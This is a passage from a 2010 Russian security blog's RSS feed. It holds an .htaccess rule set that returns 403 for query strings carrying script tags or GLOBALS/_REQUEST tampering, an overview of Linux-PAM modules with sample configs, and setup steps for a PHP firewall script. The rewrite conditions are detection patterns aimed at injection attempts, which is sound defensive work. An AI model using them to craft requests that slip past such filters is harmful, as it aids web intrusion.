+<p style="text-align: justify;">Задача данного метода &#8211; защитить переменные GLOBALS и _REQUEST от несанкционированной модификации. Для этого мы будем использовать файл .htaccess, который находиться в корне сайта. Перед тем, как вносить изменения, обязательно сделайте резервную копию этого файла. После чего откройте любой <a title="текстовый редактор" href="http://scite.ruteam.ru/" target="_blank">текстовый редактор</a> и вставьте следующее:</p>
+<p style="text-align: justify;"><div class='stb-grey_box' ></p>
+<p style="text-align: justify;">Options +FollowSymLinks<br />
+RewriteEngine On<br />
+RewriteCond %{QUERY_STRING} (\&#60;|%3C).*script.*(\&#62;|%3E) [NC,OR]<br />
+RewriteCond %{QUERY_STRING} GLOBALS(=|\[|\%[0-9A-Z]{0,2}) [OR]<br />
+RewriteCond %{QUERY_STRING} _REQUEST(=|\[|\%[0-9A-Z]{0,2})<br />
+RewriteRule ^(.*)$ index.php [F,L]<br />
+</div></p>
+<p style="text-align: justify;">Данный код осуществляет проверку всех запросов на наличие ненадежных JavaScript-ов (ищет тег &#60;script&#62;), а также попытки изменения переменных GLOBALS и _REQUEST и в случае обнаружения взлома выдает злоумышленнику ошибку 403.</p>
+<p style="text-align: justify;">
+<hr/>Copyright &#169; 2010 <strong><a href="http://securos.org.ua">SecurOS :: безопасность, хакерство, секреты взлома</a></strong>. This Feed is for personal non-commercial use only. If you are not reading this material in your news aggregator, the site you are looking at is guilty of copyright infringement. Please contact legal@securos.org.ua so we can take legal action immediately.<br/><span style="float: right;font-size: 7pt"><a href="http://blog.taragana.com/index.php/archive/wordpress-plugins-provided-by-taraganacom/">Plugin</a> by <a href="http://www.taragana.com/">Taragana</a></span>
+<p><a href="http://feedads.g.doubleclick.net/~a/uWeiSe9n0huoYtz4k9gboCyiFVQ/0/da"><img src="http://feedads.g.doubleclick.net/~a/uWeiSe9n0huoYtz4k9gboCyiFVQ/0/di" border="0" ismap="true"></img></a><br/>
+<a href="http://feedads.g.doubleclick.net/~a/uWeiSe9n0huoYtz4k9gboCyiFVQ/1/da"><img src="http://feedads.g.doubleclick.net/~a/uWeiSe9n0huoYtz4k9gboCyiFVQ/1/di" border="0" ismap="true"></img></a></p><div class="feedflare">
+<a href="http://feeds.feedburner.com/~ff/securos/feed?a=NNPC8DvCcS4:2pmaFabmzg8:yIl2AUoC8zA"><img src="http://feeds.feedburner.com/~ff/securos/feed?d=yIl2AUoC8zA" border="0"></img></a>
+</div><img src="http://feeds.feedburner.com/~r/securos/feed/~4/NNPC8DvCcS4" height="1" width="1"/>]]></content:encoded>
+      <slash:comments>15</slash:comments>
+    </item>
+    <item>
+      <title>Краткое описание некоторых аутентификационных модулей Linux-PAM</title>
+      <link>http://feedproxy.google.com/~r/securos/feed/~3/vBMtABlZnpY/</link>
+      <wfw:commentRss xmlns:wfw="http://wellformedweb.org/CommentAPI/">http://securos.org.ua/kratkoe-opisanie-nekotoryx-autentifikacionnyx-modulej-linux-pam/feed/</wfw:commentRss>
+      <feedburner:origLink xmlns:feedburner="http://rssnamespace.org/feedburner/ext/1.0">http://securos.org.ua/kratkoe-opisanie-nekotoryx-autentifikacionnyx-modulej-linux-pam/</feedburner:origLink>
+      <description>Существует множество модулей аутентификации, как самописных так и стандартных, ниже представлены самые распространенные из них.
+pam_permit
+В любом режиме всегда возвращает успех.
+pam_deny
+В любом режиме всегда возвращает ошибку.
+pam_unix
+Используется в режимах аутентификации пользователей, управления учетными записями, управления паролями и управления пользовательскими сеансами.
+Реализует базовую функциональность Unix-систем в этом отношении.
+В режиме аутентификации
+проверяет действительность пользователя по предоставленному паролю. Информацию о пароле пользователя [...]</description>
+      <category>Модули аутентификации PAM</category>
+      <pubDate>Wed, 07 Jul 2010 21:21:04 GMT</pubDate>
+      <guid isPermaLink="false">http://securos.org.ua/?p=1682</guid>
+      <dc:creator>carerakjan</dc:creator>
+      <dc:date>2010-07-07T21:21:04Z</dc:date>
+      <content:encoded><![CDATA[<p><img class="alignleft size-full wp-image-1683" title="pam_modules_securos.org.ua" src="http://securos.org.ua/wp-content/uploads/2010/06/pam_modules_securos.org_.ua_.jpg" alt="pam modules securos.org .ua  Краткое описание некоторых аутентификационных модулей Linux PAM" width="433" height="359" /></p>
+<p style="text-align: justify;">Существует множество модулей аутентификации, как самописных так и стандартных, ниже представлены самые распространенные из них.</p>
+<p style="text-align: justify;"><strong>pam_permit</strong><br />
+В любом режиме всегда возвращает успех.</p>
+<p style="text-align: justify;"><strong>pam_deny</strong><br />
+В любом режиме всегда возвращает ошибку.</p>
+<p style="text-align: justify;"><strong>pam_unix</strong><br />
+Используется в режимах аутентификации пользователей, управления учетными записями, управления паролями и управления пользовательскими сеансами.</p>
+<p style="text-align: justify;">Реализует базовую функциональность Unix-систем в этом отношении.</p>
+<h3 style="text-align: justify;"><span style="color: #888888;">В режиме аутентификации</span></h3>
+<p style="text-align: justify;">проверяет действительность пользователя по предоставленному паролю. Информацию о пароле пользователя ищет в соответствии с алгоритмом, заданным в конфигурационном файле /etc/nssswitch.conf (в файлах /etc/passwd, /etc/shadow и/или в базе данных NIS-домена).<br />
+Некоторые из возможных опций:<br />
+-    nullok: разрешать аутентификацию пользователей с пустым паролем (по умолчанию использование пустых паролей не разрешается).</p>
+<h3 style="text-align: justify;"><span style="color: #888888;">В режиме управления учетными записями </span></h3>
+<p style="text-align: justify;">проверяет состояние учетной записи и пароль, анализируя содержание файла /etc/shadow. Если срок действия пароля истек, может предложить (или выдвинуть требование) пользователю изменить пароль.</p>
+<h3 style="text-align: justify;"><span style="color: #888888;">В режиме управления паролями </span></h3>
+<p style="text-align: justify;">разрешает изменить пароль пользователя. Пароли при этом может искать/сохранять в файлах /etc/passwd, /etc/shadow или в базе данных NIS-домена – в зависимости от опций (по умолчанию использует файл /etc/passwd). Может использовать для шифрования паролей традиционный для UNIX-систем алгоритм (базируется на стандарте 3DES, доступный через функцию crypt(3), является алгоритмом по умолчанию), расширенную версию традиционного алгоритма (разрешает шифровать более чем 8 первых символов пароля; применяется, если pam_unix вызывается с опцией bigcrypt), алгоритм MD5 (применяется, если pam_unix вызывается с опцией md5). Может запоминать заданное количество (зашифрованных по алгоритму MD5) паролей каждого пользователя (в файле /etc/security/opasswd; количество паролей для запоминания задается опцией remember (по умолчанию это количество равняется 0)). Последняя возможность используется такими модулями, как pam_cracklib, для проверки степени новизны паролей, которые вводятся пользователем.<br />
+<div class='stb-grey-caption_box' >Некоторые из возможных опций:</div><div class='stb-grey-body_box' ></p>
+<ul style="text-align: justify;">
+<li><strong>nullok</strong>: разрешать принимать в качестве новых паролей пустые строки;</li>
+<li><strong>use_authtok</strong>: принуждает модуль pam_unix принять в качестве нового пароля пароль, полученный от предыдущего модуля;</li>
+<li><strong>md5</strong>: использовать для шифрования паролей алгоритм MD5;</li>
+<li><strong>shadow</strong>: искать/сохранять пароли в файле /etc/shadow.</div></li>
+</ul>
+<h3 style="text-align: justify;"><span style="color: #888888;">В режиме управления сеансами</span></h3>
+<p style="text-align: justify;">перед началом и завершением пользовательской сессии регистрирует через функцию syslog(3) имя пользователя и наименование службы.</p>
+<p><strong>pam_stack</strong><br />
+Используется в любом режиме. Разрешает из стека одной службы “вызвать” стек другой службы. Благодаря этому можно избежать дублирования записей в конфигурационном файле. Служба, стек которой необходимо вызвать, определяется через аргумент service.<br />
+<div class='stb-grey-caption_box' >Пример использования:</div><div class='stb-grey-body_box' ><em><br />
+</em><span style="text-decoration: underline;">/etc/pam.d/imap:</span><br />
+auth required pam_stack.so service=system-auth<br />
+auth required pam_shells.so<br />
+<span style="text-decoration: underline;">/etc/pam.d/system-auth:</span><br />
+auth sufficient pam_krb5.so<br />
+auth sufficient pam_unix.so shadow nullok<br />
+auth required   pam_deny.so</div></p>
+<p style="text-align: justify;"><strong>pam_rootok<br />
+</strong>Используется только в режиме аутентификации пользователей. Предназначенный для использования в ситуациях, когда суперпользователь желает получать доступ к службе без введения пароля. Аутентификация проходит успешно, если и только если UID пользователя равняется 0.<br />
+Этот модуль не следует использовать для аутентификации пользователей серверами, которые запускаются суперпользователем или во время инициализации системы.<br />
+<div class='stb-grey-caption_box' >Пример использования:</div><div class='stb-grey-body_box' ><em><br />
+</em>Программа su традиционно разрешает суперпользователю изменять идентичность без введения пароля. Чтобы смоделировать это поведение с помощью Linux-PAM, нужно в соответствующее место конфигурационного файла добавить следующие два строки:<br />
+#<br />
+# su authentication. Root is granted access by default.<br />
+#<br />
+su auth sufficient pam_rootok.so<br />
+su auth required pam_unix_auth.so</div></p>
+<p><strong>pam_wheel</strong><br />
+Используется только в режиме аутентификации пользователей. Дает возможность получать полномочия суперпользователя только членам группы wheel (GID = 0).</p>
+<p><strong>pam_nologin</strong><br />
+Используется только в режимах аутентификации пользователей и управления учетными записями.<br />
+В любом случае, если файл /etc/nologin существует, возвращается успех только для суперпользователя, при этом всем пользователям выводится содержание файла /etc/nologin.</p>
+<p style="text-align: justify;"><strong>pam_listfile<br />
+</strong>Используется только в режиме аутентификации пользователей.<br />
+Выполняет аутентификацию пользователя, базируясь на содержании произвольно заданного (текстового) файла.<br />
+Возможные опции:</p>
+<ul>
+<li style="text-align: justify;"><strong>item=user|tty|rhost|ruser|group|shell</strong>: указывает, какую величину нужно сверить с содержанием файла (user указывает на имя пользователя, от лица которого поступил запрос (PAM_USER), tty указывает на имя терминала, с которого поступил запрос (PAM_TTY), rhost указывает на имя узла, с которого поступил запрос (PAM_RHOST), ruser указывает на имя пользователя, который послал запрос (имя, под которым он выступает на том узле, с которого поступил запрос) (PAM_RUSER), group указывает на имя группы, к которой принадлежит пользователь, от лица которого поступил запрос, shell указывает на командный интерпретатор пользователя, от лица которого поступил запрос);</li>
+<li><strong>file=filename</strong>: указывает имя файла, в котором нужно выполнять поиск;</li>
+<li><strong>sense=allow|deny</strong>: определяет поведение модуля в случае, когда заданная опцией item величина найдена или не найдена в файле (сообщить об успехе аутентификации, когда величина найдена, и sense=allow, или когда величина не найдена, и sense=deny, в других случаях сообщить о неуспехе);</li>
+<li><strong>|fail</strong>: определяет поведение модуля в случае ошибки открытия файла и т.п. (succeed &#8211; сообщить об успехе, fail &#8211; об ошибке);</li>
+<li><strong>apply=user|@group</strong>: разрешает сузить применение ограничений к отдельному пользователю или группе (имеет смысл только вместе с item, что равняется tty, rhost или shell).</li>
+</ul>
+<div class='stb-grey-caption_box' >Пример использования:</div><div class='stb-grey-body_box' ><br />
+Следующая строка в конфигурационном файле /etc/pam.conf моделирует традиционное для службы ftp применение файла /etc/ftpusers:<br />
+#<br />
+# deny ftp-access to users listed in the /etc/ftpusers file<br />
+#<br />
+ftp auth required pam_listfile.so onerr=succeed item=user sense=deny file=/etc/ftpusers</div>
+<p style="text-align: justify;"><div class='stb-grey-caption_box' >Для того, чтобы разрешить заходить в систему только отдельным пользователям (перечисленным в файле /etc/loginusers), достаточно поместить в файле /etc/pam.conf следущую строку:</div><div class='stb-grey-body_box' ><br />
+#<br />
+# permit login to users listed in /etc/loginusers<br />
+#<br />
+login auth required pam_listfile.so onerr=fail item=user sense=allow file=/etc/loginusers</div></p>
+<p><strong>pam_shells</strong><br />
+Используется только в режиме аутентификации пользователей.<br />
+Аутентификация проходит успешно, если и только если командный интерпретатор пользователя обозначен в файле /etc/shells.</p>
+<p style="text-align: justify;"><strong>pam_securetty</strong><br />
+Используется только в режиме аутентификации пользователей.<br />
+Сообщает об успехе аутентификации суперпользователя, только если он посылает запрос с &#8220;безопасного&#8221; терминала (список таких терминалов берется с файла /etc/securetty).</p>
+<p style="text-align: justify;"><strong>pam_rhosts_auth</strong><br />
+Используется только в режиме аутентификации пользователей.<br />
+Аутентификация проходит успешно, если и только если узел, с которого присылается запрос, присутствует в перечне, который содержится в файле /etc/hosts.equiv, или пара &#8220;отдаленное имя пользователя &#8211; отдаленный узел&#8221; обозначена в файле ~/.rhosts.<br />
+Это традиционный элемент работы таких служб, как rlogin, rsh.</p>
+<p style="text-align: justify;"><strong>pam_timestamp</strong><br />
+Используется только в режимах аутентификации пользователей и управления сеансами.</p>
+<h3><span style="color: #888888;">В режиме аутентификации пользователей</span></h3>
+<p style="text-align: justify;">проверяет наличие в своем кеше информации о предыдущих успешных сеансах этого пользователя и сообщает об успешной аутентификации, если ее находит (и неуспешную, если не находит).</p>
+<h3><span style="color: #888888;">В режиме управления сеансами</span></h3>
+<p style="text-align: justify;">создает в своему кеше соответствующий файл.<br />
+Основные опции:</p>
+<ul>
+<li style="text-align: justify;"><strong>timestampdir=name</strong>: указывает каталог для размещения кеша (по умолчанию &#8211; /var/run/sudo);</li>
+<li><strong>timestamp_timeout=number</strong>: указывает интервал времени (в секундах), на протяжении которого файлы в кеше остаются действительными после их создания (значение по умолчанию: 600).</li>
+</ul>
+<div class='stb-grey-caption_box' >Пример использования:</div><div class='stb-grey-body_box' ><em><br />
+</em>/etc/pam.d/some-config-tool:<br />
+auth        sufficient pam_timestamp.so<br />
+auth        required   pam_unix.so<br />
+session     required   pam_permit.so<br />
+session     optional   pam_timestamp.so</div>
+<p style="text-align: justify;"><strong>pam_console</strong><br />
+Используется только в режимах аутентификации пользователей и управления сеансами.</p>
+<h3><span style="color: #888888;">В режиме аутентификации пользователей</span></h3>
+<p style="text-align: justify;">возвращает успех только и если только запрос поступает из локальной консоли.</p>
+<h3><span style="color: #888888;">В режиме управления сеансами</span></h3>
+<p style="text-align: justify;">дает возможность предоставлять пользователям, которые начинают локальный сеанс работы, дополнительные полномочия (а по завершению сеанса их забирать). Дополнительные полномочия формулируются как дополнительные права доступа к файлам и описываются в конфигурационном файле (/etc/security/console.perm по умолчанию) (на практике дело касается переопределения владельцев и списков контроля доступа к отдельным  файлам устройств (таких, как /dev/cdrom, /dev/fd0)).</p>
+<p style="text-align: justify;"><strong>pam_env</strong></p>
+<p style="text-align: justify;">Используется только в режиме аутентификации пользователей (и реагирует только на вызов pam_setcred(3) (который выполняется, по обыкновению, после успешной аутентификации пользователя)).</p>
+<p style="text-align: justify;">Выполняет инициализацию/деинициализацию отдельных переменных окружения. Перечень этих переменных и их значения задаются через конфигурационные файлы (по умолчанию, /etc/security/pam_env.conf и /etc/environment).</p>
+<p style="text-align: justify;"><strong>pam_limits<br />
+</strong>Используется только в режиме управления сеансами.</p>
+<p style="text-align: justify;">Разрешает установить ограничение на использование ресурсов, которые могут быть получены пользователем на протяжении сеанса. Перечень ограничений задается конфигурационным файлом (по умолчанию, /etc/security/limits.conf). На суперпользователя эти ограничения не распространяются.<br />
+<div class='stb-grey-caption_box' >Могут применяться следующие виды ограничений:</div><div class='stb-grey-body_box' ></p>
+<ul>
+<li style="text-align: justify;">максимальный размер core-файла;</li>
+<li>максимальный размер создаваемых пользователем файлов;</li>
+<li>максимальное количество открытых пользователем файлов;</li>
+<li>максимальное количество заблокированных пользователем файлов;</li>
+<li>максимальный размер адресного пространства, который может быть выделен создаваемым пользователем процессам;</li>
+<li>максимальный размер сегмента данных создаваемых пользователем процессам;</li>
+<li>максимальный размер сегмента стека создаваемых пользователем процессам;</li>
+<li>максимальный размер адресного пространства, заблокированного пользователем в памяти;</li>
+<li>максимальный размер занятой пользователем физической оперативной памяти;</li>
+<li>максимальное количество активных процессов;</li>
+<li>максимальный приоритет процессов, созданных пользователем;</li>
+<li>максимальное количество полученного на протяжении сеанса процессорного времени;</li>
+<li>максимальное количество открытых сеансов (как отдельным пользователем, так и вообще в системе).</div></li>
+</ul>
+<p style="text-align: justify;"><strong>pam_cracklib</strong><br />
+Используется только в режиме управления паролями (а именно, для проверки прочности паролей, которые вводятся пользователями) в связке с другими модулями (которые должны выполнять собственно изменение пароля).</p>
+<p style="text-align: justify;">Работа данного модуля по умолчанию заключается в следующем: получить от пользователя пароль, проверить его на прочность, и, если он окажется достаточно крепким, спросить подтверждение введенного пароля и сравнить его с изначально введенным значением. Дальше, если данный модуль отработает успешно, пароль передается следующему в связке модулю.<br />
+<div class='stb-grey-caption_box' >Могут выполняться следующие проверки прочности паролей:</div><div class='stb-grey-body_box' ></p>
+<ul>
+<li style="text-align: justify;">проверка на соответствие словам из словаря;</li>
+<li>некоторые проверки на соответствие паролям, которые уже использовались данным пользователем (сохраняются модулем pam_unix в файле /etc/security/opasswd);</li>
+<li>проверка на достаточную длину;</li>
+<li>несколько проверок на достаточное разнообразие символов.</div></li>
+</ul>
+<div class='stb-grey-caption_box' >Возможные опции (почти все):</div><div class='stb-grey-body_box' ></p>
+<ul>
+<li><strong>retry=N</strong>: задает максимальное количество попыток выбрать надежный пароль, которые могут быть предоставлены пользователю (по умолчанию предоставляется лишь одна такая попытка);</li>
+<li><strong>type=XXX</strong>: замещает в стандартных приглашениях на введение нового паролю &#8220;New UNIX password&#8221; и &#8220;Retype UNIX password&#8221; слово “UNIX” рядком XXX;</li>
+<li><strong>difok=N</strong>: определяет минимально допустимое количество символов, присутствующих в новом и отсутствующих в старом пароле (значение по умолчанию 10) (если хотя бы половина символов в новом пароле не встречается в старом, пароль также будет принят);</li>
+<li><strong>minlen=N</strong>: определяет минимально допустимую длину нового пароля (значение по умолчанию 9) (нужно иметь в виду, что, во-первых, опции dcredit, lcredit, ucredit, ocredit могут фактически увеличивать эту величину, во-вторых, эта величина не может быть меньше 6);</li>
+<li><strong>dcredit=N</strong>: если N&#62;=0, определяет максимальный кредит минимально допустимой длины нового пароля, выделенный на включение в пароль цифр (N первых цифр не будут учитываться при сравнивании длины пароля с минимально допустимой; по умолчанию это значение 1); если N&#60;0, определяет минимально допустимое количество цифр в новом пароле;</li>
+<li><strong>ucredit=N</strong>: если N&#62;=0, определяет максимальный кредит минимально допустимой длины нового пароля, выделенный на включение в пароль букв в верхнем регистре (N первое количество букв в верхнем регистре не будут учитываться при сравнивании длины пароля с минимально допустимой; по умолчанию это значение 1); если N&#60;0, определяет минимально допустимое количество букв в верхнем регистре в новом пароле;</li>
+<li><strong>lcredit=N</strong>: если N&#62;=0, определяет максимальный кредит минимально допустимой длины нового пароля, выделенный на включение в пароль букв в нижнем регистре (N первых букв в нижнем регистре не будут учитываться при сравнивании длины пароля с минимально допустимой; по умолчанию это значение 1); если N&#60;0, определяет минимально допустимое количество букв в нижнем регистре в новом пароле;</li>
+<li><strong>ocredit=N</strong>: если N&#62;=0, определяет максимальный кредит минимально допустимой длины нового паролю, выделенный на включение в пароль других символов (N первых таких символов не будут учитываться при сравнивании длины пароля с минимально допустимой; по умолчанию это значение 1); если N&#60;0, определяет минимально допустимое количество других символов в новом пароле (по умолчанию это ограничение не накладывается).</div></li>
+</ul>
+<p style="text-align: justify;"><div id="stb-container" class="stb-container"><div id='caption' class='stb-info-caption_box' >Источники дополнительной информации:</div><div id='body' class='stb-info-body_box' ><br />
+Файл /usr/share/doc/pam-X.XX/txts/README.pam_xxx.</div></div>
+<hr/>Copyright &#169; 2010 <strong><a href="http://securos.org.ua">SecurOS :: безопасность, хакерство, секреты взлома</a></strong>. This Feed is for personal non-commercial use only. If you are not reading this material in your news aggregator, the site you are looking at is guilty of copyright infringement. Please contact legal@securos.org.ua so we can take legal action immediately.<br/><span style="float: right;font-size: 7pt"><a href="http://blog.taragana.com/index.php/archive/wordpress-plugins-provided-by-taraganacom/">Plugin</a> by <a href="http://www.taragana.com/">Taragana</a></span>
+<p><a href="http://feedads.g.doubleclick.net/~a/TcOlTovlI3y-oXSPezV74Yg7TA0/0/da"><img src="http://feedads.g.doubleclick.net/~a/TcOlTovlI3y-oXSPezV74Yg7TA0/0/di" border="0" ismap="true"></img></a><br/>
+<a href="http://feedads.g.doubleclick.net/~a/TcOlTovlI3y-oXSPezV74Yg7TA0/1/da"><img src="http://feedads.g.doubleclick.net/~a/TcOlTovlI3y-oXSPezV74Yg7TA0/1/di" border="0" ismap="true"></img></a></p><div class="feedflare">
+<a href="http://feeds.feedburner.com/~ff/securos/feed?a=vBMtABlZnpY:jd3PePBNeT0:yIl2AUoC8zA"><img src="http://feeds.feedburner.com/~ff/securos/feed?d=yIl2AUoC8zA" border="0"></img></a>
+</div><img src="http://feeds.feedburner.com/~r/securos/feed/~4/vBMtABlZnpY" height="1" width="1"/>]]></content:encoded>
+      <slash:comments>1</slash:comments>
+    </item>
+    <item>
+      <title>Пишем firewall на PHP</title>
+      <link>http://feedproxy.google.com/~r/securos/feed/~3/CAxzGhyB8aA/</link>
+      <wfw:commentRss xmlns:wfw="http://wellformedweb.org/CommentAPI/">http://securos.org.ua/pishem-firewall-na-php/feed/</wfw:commentRss>
+      <feedburner:origLink xmlns:feedburner="http://rssnamespace.org/feedburner/ext/1.0">http://securos.org.ua/pishem-firewall-na-php/</feedburner:origLink>
+      <description>Надо отдать должное людям, которые работают в направлении безопасности web-ресурсов.
+Буржуй-нет полон такого рода всякими скриптами. Например, недавно скачал для себя PHP Firewall. Скрипт поддерживает PHP 5, не нуждается в базе, прост в использовании и мало весит, ко всему этому нет затруднений в установке и работе, при наличии определенных навыков, мозга и более или менее ровных [...]</description>
+      <category>Безопасность скриптов</category>
+      <pubDate>Mon, 05 Jul 2010 06:50:14 GMT</pubDate>
+      <guid isPermaLink="false">http://securos.org.ua/?p=1717</guid>
+      <dc:creator>carerakjan</dc:creator>
+      <dc:date>2010-07-05T06:50:14Z</dc:date>
+      <content:encoded><![CDATA[<p><img class="alignleft size-full wp-image-1727" title="firewall_php_securos.org.ua" src="http://securos.org.ua/wp-content/uploads/2010/07/firewall_php_securos.org_.ua_.png" alt="firewall php securos.org .ua  Пишем firewall на PHP" width="450" height="256" /></p>
+<p style="text-align: justify;">Надо отдать должное людям, которые работают в направлении безопасности web-ресурсов.</p>
+<p style="text-align: justify;">Буржуй-нет полон такого рода всякими скриптами. Например, недавно скачал для себя PHP Firewall. Скрипт поддерживает PHP 5, не нуждается в базе, прост в использовании и мало весит, ко всему этому нет затруднений в установке и работе, при наличии определенных навыков, мозга и более или менее ровных рук. PHP Firewall имеет свою систему сбора информации (логи), а также модуль email оповещения о тревоге. Нет необходимости использования .htaccess, хотя я в этом не уверен. Скрипт можно использовать для всех видов cms, блогов, форумов и всего что на ум придет.</p>
+<p style="text-align: justify;"><div class='stb-grey-caption_box' >Возможности  PHP Firewall по словам разработчика:</div><div class='stb-grey-body_box' ></p>
+<ul style="text-align: justify;">
+<li style="text-align: justify;"> защита XSS</li>
+<li>защита от UNION SQL-инъекций</li>
+<li>защита от DOS</li>
+<li>защита include</li>
+<li>защита от червей</li>
+<li>серверная защита (не проверено)</li>
+<li>защита URL запроса</li>
+<li>профилактика Cookies</li>
+<li>профилактика запросов POST, GET</li>
+<li>запрет на сканирование IP</li>
+<li>блокировка спама с определенного IP</li>
+<li>комплексная защита IP</li>
+<li>сброс глобальных переменных PHP </div></li>
+</ul>
+<p style="text-align: justify;"><strong> </strong></p>
+<h1 style="text-align: justify;"><span style="color: #888888;"><strong>Установка/внедрение </strong><strong>PHP </strong><strong>Firewall в сайт</strong></span></h1>
+<p style="text-align: justify;"><strong> </strong></p>
+<ul style="text-align: justify;">
+<li>создать папку, например php-firewall/ в корне сайта</li>
+<li>выставить необходимые права доступа на файл php-firewall/logs.txt (например, 755)</li>
+<li>добавить строки в основной код страницы сайта</li>
+</ul>
+
+<div class="wp_syntax"><div class="code"><pre class="php" style="font-family:monospace;"><span style="color: #339933;">&#60;</span> ?php  <span style="color: #990000;">define</span><span style="color: #009900;">&#40;</span><span style="color: #0000ff;">'PHP_FIREWALL_REQUEST_URI'</span><span style="color: #339933;">,</span> <span style="color: #990000;">strip_tags</span><span style="color: #009900;">&#40;</span> <span style="color: #000088;">$_SERVER</span><span style="color: #009900;">&#91;</span><span style="color: #0000ff;">'REQUEST_URI'</span><span style="color: #009900;">&#93;</span> <span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+<span style="color: #990000;">define</span><span style="color: #009900;">&#40;</span><span style="color: #0000ff;">'PHP_FIREWALL_ACTIVATION'</span><span style="color: #339933;">,</span> <span style="color: #009900; font-weight: bold;">true</span> <span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+<span style="color: #b1b100;">if</span> <span style="color: #009900;">&#40;</span> <span style="color: #990000;">is_file</span><span style="color: #009900;">&#40;</span> <span style="color: #339933;">@</span><span style="color: #990000;">dirname</span><span style="color: #009900;">&#40;</span><span style="color: #009900; font-weight: bold;">__FILE__</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">.</span><span style="color: #0000ff;">'/php-firewall/firewall.php'</span> <span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#41;</span>
+<span style="color: #b1b100;">include_once</span><span style="color: #009900;">&#40;</span> <span style="color: #339933;">@</span><span style="color: #990000;">dirname</span><span style="color: #009900;">&#40;</span><span style="color: #009900; font-weight: bold;">__FILE__</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">.</span><span style="color: #0000ff;">'/php-firewall/firewall.php'</span> <span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span> <span style="color: #000000; font-weight: bold;">?&#62;</span></pre></div></div>
+
+<p style="text-align: justify;">Для деактевации PHP Firewall, редактируйте строку:</p>
+
+<div class="wp_syntax"><div class="code"><pre class="php" style="font-family:monospace;"><span style="color: #990000;">define</span><span style="color: #009900;">&#40;</span><span style="color: #0000ff;">'PHP_FIREWALL_ACTIVATION'</span><span style="color: #339933;">,</span> <span style="color: #009900; font-weight: bold;">false</span> <span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span></pre></div></div>
+
+<p style="text-align: justify;">
+<h1 style="text-align: justify;"><span style="color: #888888;"><strong>Конфигурирование </strong><strong>PHP </strong><strong>Firewall</strong></span></h1>
+<p style="text-align: justify;">Вы можете активировать/деактивировать большинство функций защиты в PHP Firewall. Для этого необходимо открыть файл php-firewall/firewall.php. Все параметры, находящиеся между строками 23 и 39 и которые имеют true/false можно редактировать, соответственно включая/отключая  их.</p>
+
+<div class="wp_syntax"><div class="code"><pre class="php" style="font-family:monospace;"><span style="color: #990000;">define</span><span style="color: #009900;">&#40;</span><span style="color: #0000ff;">'PHP_FIREWALL_ADMIN_MAIL'</span><span style="color: #339933;">,</span> <span style="color: #0000ff;">''</span> <span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>  <span style="color: #666666; font-style: italic;">// напишите свою электронную почту и PHP Firewall оповестит о несанкционированном доступе</span>
+<span style="color: #990000;">define</span><span style="color: #009900;">&#40;</span><span style="color: #0000ff;">'PHP_FIREWALL_PUSH_MAIL'</span><span style="color: #339933;">,</span> <span style="color: #009900; font-weight: bold;">false</span> <span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span> <span style="color: #666666; font-style: italic;">// отчет работы системы на электронную почту</span>
+<span style="color: #990000;">define</span><span style="color: #009900;">&#40;</span><span style="color: #0000ff;">'PHP_FIREWALL_LOG_FILE'</span><span style="color: #339933;">,</span> <span style="color: #0000ff;">'logs'</span> <span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>  <span style="color: #666666; font-style: italic;">// название файла сбора статистики ‘logs’ для  PHP Firewall</span>
+<span style="color: #990000;">define</span><span style="color: #009900;">&#40;</span><span style="color: #0000ff;">'PHP_FIREWALL_PROTECTION_RANGE_IP_DENY'</span><span style="color: #339933;">,</span> <span style="color: #009900; font-weight: bold;">true</span> <span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span> <span style="color: #666666; font-style: italic;">// блокатор занятых IP</span>
+<span style="color: #990000;">define</span><span style="color: #009900;">&#40;</span><span style="color: #0000ff;">'PHP_FIREWALL_PROTECTION_RANGE_IP_SPAM'</span><span style="color: #339933;">,</span> <span style="color: #009900; font-weight: bold;">true</span> <span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>  <span style="color: #666666; font-style: italic;">// блокатор IP-спамеров</span>
+<span style="color: #990000;">define</span><span style="color: #009900;">&#40;</span><span style="color: #0000ff;">'PHP_FIREWALL_PROTECTION_URL'</span><span style="color: #339933;">,</span> <span style="color: #009900; font-weight: bold;">true</span> <span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>  <span style="color: #666666; font-style: italic;">// URL защита</span>
+<span style="color: #990000;">define</span><span style="color: #009900;">&#40;</span><span style="color: #0000ff;">'PHP_FIREWALL_PROTECTION_REQUEST_SERVER'</span><span style="color: #339933;">,</span> <span style="color: #009900; font-weight: bold;">true</span> <span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span> <span style="color: #666666; font-style: italic;">// защита запросов</span>
+<span style="color: #990000;">define</span><span style="color: #009900;">&#40;</span><span style="color: #0000ff;">'PHP_FIREWALL_PROTECTION_SANTY'</span><span style="color: #339933;">,</span> <span style="color: #009900; font-weight: bold;">true</span> <span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span> <span style="color: #666666; font-style: italic;">// защита от червя</span>
+<span style="color: #990000;">define</span><span style="color: #009900;">&#40;</span><span style="color: #0000ff;">'PHP_FIREWALL_PROTECTION_BOTS'</span><span style="color: #339933;">,</span> <span style="color: #009900; font-weight: bold;">true</span> <span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span> <span style="color: #666666; font-style: italic;">// защита от ботов</span>
+<span style="color: #990000;">define</span><span style="color: #009900;">&#40;</span><span style="color: #0000ff;">'PHP_FIREWALL_PROTECTION_REQUEST_METHOD'</span><span style="color: #339933;">,</span> <span style="color: #009900; font-weight: bold;">true</span> <span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span> <span style="color: #666666; font-style: italic;">// Bad method protection</span>
+<span style="color: #990000;">define</span><span style="color: #009900;">&#40;</span><span style="color: #0000ff;">'PHP_FIREWALL_PROTECTION_DOS'</span><span style="color: #339933;">,</span> <span style="color: #009900; font-weight: bold;">true</span> <span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span> <span style="color: #666666; font-style: italic;">// Mini dos защита</span>
